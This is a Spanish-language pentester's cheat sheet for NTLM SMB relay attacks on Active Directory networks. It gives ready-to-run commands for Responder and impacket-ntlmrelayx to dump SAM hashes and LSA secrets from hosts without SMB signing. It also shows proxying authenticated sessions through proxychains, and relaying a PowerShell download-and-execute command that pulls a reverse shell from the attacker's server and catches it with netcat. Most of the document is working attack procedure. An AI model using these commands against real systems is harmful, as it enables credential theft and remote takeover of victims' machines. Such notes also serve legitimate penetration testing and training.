# NTLM - SMB Relay 

Tags: #AD #NTLMRelay #SMB

El **SMB Relay** es un ataque donde el atacante intercepta una autenticación **NTLM** de una víctima y la reutiliza en tiempo real contra otro servidor. Primero, una máquina en la red intenta conectarse a un recurso que no existe; el atacante responde haciéndose pasar por ese host usando herramientas como **Responder**, lo que provoca que la víctima intente autenticarse mediante NTLM. Durante el handshake se genera un **NetNTLMv2 challenge-response**, y en lugar de almacenarlo, el atacante lo reenvía inmediatamente a otro servidor mediante **ntlmrelayx** del framework **Impacket**. Si el servidor destino no tiene **SMB signing obligatorio** y la cuenta que se autenticó tiene permisos, la herramienta ejecuta acciones post-explotación como dumpear la **SAM**, obteniendo los hashes de las cuentas locales del sistema comprometido.

```bash 
❯ nxc smb 192.168.20.0/24     # Descubrir hosts con el servicio SMB activo con "signing:False"
```

## Forma 1 

```bash 
# Si la máquina que hace la petición tiene permisos, se puede dumpear la SAM del servidor destino que no tiene 'SMB signing obligatorio'
❯ impacket-ntlmrelayx -smb2support -tf targets.txt   
	# targets.txt = IPs que tienen SMB con "signing:False"
```

```bash 
❯ nvim /etc/responder/Responder.conf   # Modificar el archivo para desactivar "Off" los servidores que levanta el ntlmrelayx como: 'SMB, HTTP y WinRM'

❯ responder -I eth0
```

## Forma 2

```bash  
❯ impacket-ntlmrelayx -smb2support -tf targets.txt -socks  
	# targets.txt = IPs que tienen SMB con "signing:False"

# Al capturar la petición se puede pulsar enter y hacer lo siguiente:
	❯ socks    # Mirar la conexión activa del usuario en el target víctima
```

```bash 
❯ nvim /etc/responder/Responder.conf   # Modificar el archivo para desactivar "Off" los servidores que levanta el ntlmrelayx como: 'SMB, HTTP y WinRM'

❯ responder -I eth0
```

Utilizar Proxychains para decir que la tool que ejecutemos redirija el tráfico que genere a traves del proxy que se configure 

```bash 
❯ nvim /etc/proxychains4.conf      # Modificar la última linea de la siguiente manera
	socks4 127.0.0.1 1080         # El puerto 1080 es donde acepta peticiones el ntlmrelayx

❯ proxychains4 nxc smb IP_Target -u 'Administrador' -d domain1   # Muestra OK en el SMB 
	# IP_Target = Es la IP de la máquina con "signing:False"

# Si todo sale bien, se pueden ejecutar los siguientes comandos del servidor destino que no tiene 'SMB signing obligatorio':
❯ proxychains4 nxc smb IP_Target -u 'Administrador' -d domain1 -p '12345' 
# Se puede colocar cualquier password y siempre dará 'Pwn3d!' ya que la autenticación ya se hizo y solo es importante para que se pueda ejecutar el siguiente comando
❯ proxychains4 nxc smb IP_Target -u 'Administrador' -d domain1 -p '12345' --sam  # Dumpear la SAM en nombre del usuario admin 
❯ proxychains4 nxc smb IP_Target -u 'Administrador' -d domain1 -p '12345' --lsa  # Dumpear los usuarios de dominio cacheados en la máquina víctima 
```

## Forma 3

* [Powershell Reverse_Shell.ps1](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)

```bash 
# Crear el archivo 'sh.ps1' y compartirlo con python 
❯ python3 -m http.server 8000

Nota:
	- Colocar la IP de Kali y el puerto a conectarse
```

```bash 
# Ejecutar un comando en la máquina víctima para obtener una 'Reverse Shell' del servidor destino que no tiene 'SMB signing obligatorio'
❯ impacket-ntlmrelayx -smb2support -tr targets.txt -c "powershell -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://IP_Kali:8000/sh.ps1')\""
	# targets.txt = IPs que tienen SMB con "signing:False"
	# sh.ps1 = Archivo que contiene la 'reverse shell' obtenida del enlace
```

```
❯ nvim /etc/responder/Responder.conf   # Modificar el archivo para desactivar "Off" los servidores que levanta el ntlmrelayx como: 'SMB, HTTP y WinRM'

❯ responder -I eth0
```

```bash  
❯ nc -nlvp 443    # Colocarse en escucha para recibir la ReverShell  
```